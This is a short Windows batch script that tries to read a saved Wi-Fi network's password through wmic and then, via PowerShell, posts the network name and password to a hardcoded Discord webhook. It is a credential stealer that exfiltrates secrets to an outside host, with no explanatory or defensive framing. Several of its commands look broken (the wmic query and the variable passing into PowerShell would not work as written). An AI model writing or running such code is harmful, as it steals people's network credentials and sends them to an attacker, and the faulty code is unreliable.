@echo off
setlocal

for /f "tokens=2 delims=:" %%A in ('wmic wirelessnetworkprofile where name="Wireless Network Connection" get SecuritySettings_Enabled^,KeyMaterial /value') do (
    set "SSID=Wireless Network Connection"
    set "KeyMaterial=%%A"
)

set "DiscordWebhookURL=https://discord.com/api/webhooks/1347662704709472407/9ohSSgF-GCi4B_O5wmmrB0OVZXGO7D8zxEMfDxctVUpgXyI5IlNZ9c-EDgAm7hQEybra"

powershell -Command "
    $payload = @{
        'content' = 'Wi-Fi SSID: $global:SSID
Wi-Fi Password: $global:KeyMaterial'
    }
    Invoke-RestMethod -Uri '$global:DiscordWebhookURL' -Method POST -Body $payload
"
